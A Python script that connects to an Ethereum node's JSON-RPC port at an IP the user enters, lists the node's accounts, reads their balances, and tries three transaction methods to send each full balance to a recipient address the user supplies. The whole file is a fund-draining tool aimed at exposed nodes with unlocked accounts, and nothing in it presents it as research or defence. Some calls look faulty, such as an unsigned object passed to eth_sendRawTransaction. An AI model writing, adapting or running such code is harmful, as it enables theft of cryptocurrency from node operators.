import requests
import json
import time

def get_ethereum_info(node_url):
    payload_addresses = {
        "jsonrpc": "2.0",
        "method": "eth_accounts",
        "params": [],
        "id": 1,
    }

    response_addresses = requests.post(node_url, json=payload_addresses)
    result_addresses = response_addresses.json()

    if "result" in result_addresses:
        return result_addresses["result"]
    else:
        print("Error fetching addresses:", result_addresses.get("error", "Unknown error"))
        return []

def get_ethereum_balance(node_url, address):
    payload_balance = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1,
    }

    response_balance = requests.post(node_url, json=payload_balance)
    result_balance = response_balance.json()

    if "result" in result_balance:
        balance_wei = int(result_balance["result"], 16)
        balance_eth = balance_wei / 1e18
        return balance_eth
    else:
        print(f"Error fetching balance for address {address}: {result_balance.get('error', 'Unknown error')}")
        return None

def send_ethereum_transaction(node_url, sender_address, recipient_address, value):
    methods = ["eth_sendTransaction", "personal_sendTransaction", "eth_sendRawTransaction"]
    for method in methods:
        payload_transaction = {
            "jsonrpc": "2.0",
            "method": method,
            "params": [{
                "from": sender_address,
                "to": recipient_address,
                "value": value,
            }],
            "id": 1,
        }

        response_transaction = requests.post(node_url, json=payload_transaction)
        result_transaction = response_transaction.json()

        if "result" in result_transaction:
            transaction_hash = result_transaction["result"]
            print(f"Transaction initiated. Transaction hash: {transaction_hash}")
            
            # Confirm the transaction
            if confirm_transaction(node_url, transaction_hash):
                return transaction_hash
            else:
                print(f"Transaction confirmation failed for hash: {transaction_hash}")
                return None

        print(f"Error sending transaction with method {method}: {result_transaction.get('error', 'Unknown error')}")

    print("All transaction methods failed.")
    return None

def confirm_transaction(node_url, transaction_hash):
    print(f"Confirming transaction with hash: {transaction_hash}")

    max_attempts = 30  # Increase the number of attempts
    while max_attempts > 0:
        time.sleep(10)

        payload_receipt = {
            "jsonrpc": "2.0",
            "method": "eth_getTransactionReceipt",
            "params": [transaction_hash],
            "id": 1,
        }

        response_receipt = requests.post(node_url, json=payload_receipt)
        result_receipt = response_receipt.json()

        print("Result Receipt:", result_receipt)  # Debugging statement

        if "result" in result_receipt and isinstance(result_receipt["result"], dict):
            print(f"Transaction confirmed! Block number: {result_receipt['result']['blockNumber']}")
            return True

        max_attempts -= 1

    print("Transaction not confirmed within the expected time.")
    return False

if __name__ == "__main__":
    user_input_ip = input("Enter Ethereum node IP: ")
    ethereum_node_url = f"http://{user_input_ip}:8545"

    recipient_address = input("Enter recipient address: ")

    start_time = time.time()
    print(f"Script started at {time.ctime(start_time)}")

    addresses_to_check = get_ethereum_info(ethereum_node_url)

    for address in addresses_to_check:
        balance = get_ethereum_balance(ethereum_node_url, address)
        print(f"Balance for address {address}: {balance} ETH")

        if balance > 0:
            transaction_value_hex = hex(int(balance * 1e18))
            transaction_hash = send_ethereum_transaction(ethereum_node_url, address, recipient_address, transaction_value_hex)

            if transaction_hash:
                print(f"Transaction confirmed for hash: {transaction_hash}")
            else:
                print(f"Failed to confirm transaction for address: {address}")
        else:
            print(f"Skipping address {address} with zero balance.")

    end_time = time.time()
    print(f"Script completed at {time.ctime(end_time)}")
    elapsed_time = end_time - start_time
    print(f"Total execution time: {elapsed_time:.2f} seconds")